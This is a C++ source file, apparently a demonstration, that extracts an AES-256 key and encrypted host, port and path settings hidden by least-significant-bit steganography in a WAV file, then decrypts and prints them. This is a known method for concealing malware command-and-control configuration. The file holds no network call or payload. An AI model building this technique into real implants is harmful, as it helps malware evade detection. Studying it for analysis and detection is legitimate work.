#include <windows.h>
#include <vector>
#include <iomanip>
#include <iostream>
#include <aes.h>
#include <fstream>
#include <tools.h>

std::vector<uint8_t> RemovePKCS7Padding(const std::vector<uint8_t>& input) {
    if (input.empty()) return {};

    uint8_t pad_len = input.back();

    if (pad_len == 0 || pad_len > input.size()) return {};

    for (size_t i = input.size() - pad_len; i < input.size(); ++i) {
        if (input[i] != pad_len) return {};
    }

    return std::vector<uint8_t>(input.begin(), input.end() - pad_len);
}


// Decrypt AES-256-CBC encrypted data
std::string DecryptAES256CBC(const std::vector<uint8_t>& ciphertext, const std::vector<uint8_t>& key, const std::vector<uint8_t>& iv) {
    std::vector<uint8_t> buffer(ciphertext); // make a copy we can decrypt in-place

    if (ciphertext.empty() || ciphertext.size() % 16 != 0) 
    {
        std::cerr << "Invalid ciphertext length for AES-CBC: " << ciphertext.size() << "\n";
        return {};
    }

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key.data(), iv.data());
    AES_CBC_decrypt_buffer(&ctx, buffer.data(), buffer.size());

    auto unpadded = RemovePKCS7Padding(buffer);
    return std::string(unpadded.begin(), unpadded.end());
}

std::vector<uint8_t> ExtractEmbeddedConfigFromWav(const std::string& filepath)
{
    std::cout << "[DEMO] Opening WAV file for steganographic extraction..." << std::endl;
    std::ifstream file(filepath, std::ios::binary);

    if(!file)
        throw std::runtime_error("Failed to open file: " + filepath);

    // Skip 44-byte WAV header
    file.seekg(44);

    // Read rest of the file into buffer
    std::vector<uint8_t> wav_data(std::istreambuf_iterator<char>(file), {});
    std::cout << "[DEMO] WAV audio data loaded: " << wav_data.size() << " bytes" << std::endl;

    // AES key + IV + LEN + ENC_FIELDS
    constexpr size_t nr_bytes_to_extract = 131;
    constexpr size_t nr_bits_to_extract = nr_bytes_to_extract * 8;
    
    std::cout << "[DEMO] Extracting " << nr_bytes_to_extract << " bytes (" << nr_bits_to_extract << " bits) using LSB steganography..." << std::endl;
    
    if(wav_data.size() < nr_bits_to_extract * 2)
        throw std::runtime_error("WAV file to small for embedded config");

    std::vector<uint8_t> result;
    result.reserve(nr_bytes_to_extract);

    for(size_t byte_index = 0; byte_index < nr_bytes_to_extract; ++byte_index)
    {
        uint8_t byte = 0;

        for(int bit = 0; bit < 8; ++bit)
        {
            size_t sample_offset = (byte_index * 8 + bit) * 2;
            uint8_t lsb = wav_data[sample_offset] & 0x01;
            byte = (byte << 1) | lsb;
        }

        result.push_back(byte);
    }

    PrintHexData("Complete extracted blob", result, 64);
    return result;
}

std::tuple<std::string, std::string, std::string> ExtractAndDecryptConfig(const std::string& filepath)
{
    std::vector<uint8_t> config = ExtractEmbeddedConfigFromWav(filepath);

    size_t index = 0;

    std::cout << "\n[DEMO] === AES-256 DECRYPTION PROCESS ===" << std::endl;
    
    // Extract AES key (32 bytes)
    auto key = std::vector<uint8_t>(config.begin(), config.begin() + 32);
    index += 32;
    PrintHexData("AES-256 Key", key);

    std::cout << "\n[DEMO] === DECRYPTING HOST CONFIGURATION ===" << std::endl;
    // Extract Host
    auto iv_host = std::vector<uint8_t>(config.begin() + index, config.begin() + index + 16);
    index += 16;
    PrintHexData("Host IV", iv_host, 16);

    uint8_t len_host = config[index++];
    auto enc_host = std::vector<uint8_t>(config.begin() + index, config.begin() + index + len_host);
    index += len_host;
    PrintHexData("Host Encrypted", enc_host);

    std::cout << "\n[DEMO] === DECRYPTING PORT CONFIGURATION ===" << std::endl;
    // Extract Port
    auto iv_port = std::vector<uint8_t>(config.begin() + index, config.begin() + index + 16);
    index += 16;
    PrintHexData("Port IV", iv_port, 16);

    uint8_t len_port = config[index++];
    auto enc_port = std::vector<uint8_t>(config.begin() + index, config.begin() + index + len_port);
    index += len_port;
    PrintHexData("Port Encrypted", enc_port);

    std::cout << "\n[DEMO] === DECRYPTING PATH CONFIGURATION ===" << std::endl;
    // Extract Path
    auto iv_path = std::vector<uint8_t>(config.begin() + index, config.begin() + index + 16);
    index += 16;
    PrintHexData("Path IV", iv_path, 16);

    uint8_t len_path = config[index++];
    auto enc_path = std::vector<uint8_t>(config.begin() + index, config.begin() + index + len_path);
    index += len_path;
    PrintHexData("Path Encrypted", enc_path);

    // Decrypt all three
    std::cout << "\n[DEMO] Performing AES-256-CBC decryption..." << std::endl;
    std::string host = DecryptAES256CBC(enc_host, key, iv_host);
    std::string port = DecryptAES256CBC(enc_port, key, iv_port);
    std::string path = DecryptAES256CBC(enc_path, key, iv_path);

    std::cout << "[DEMO] Host decrypted: \"" << host << "\"" << std::endl;
    std::cout << "[DEMO] Port decrypted: \"" << port << "\"" << std::endl;
    std::cout << "[DEMO] Path decrypted: \"" << path << "\"" << std::endl;

    // Securely clear the key from memory
    std::cout << "[DEMO] Securely clearing AES key from memory..." << std::endl;
    SecureZeroMemory(key.data(), key.size());

    return {host, port, path};
}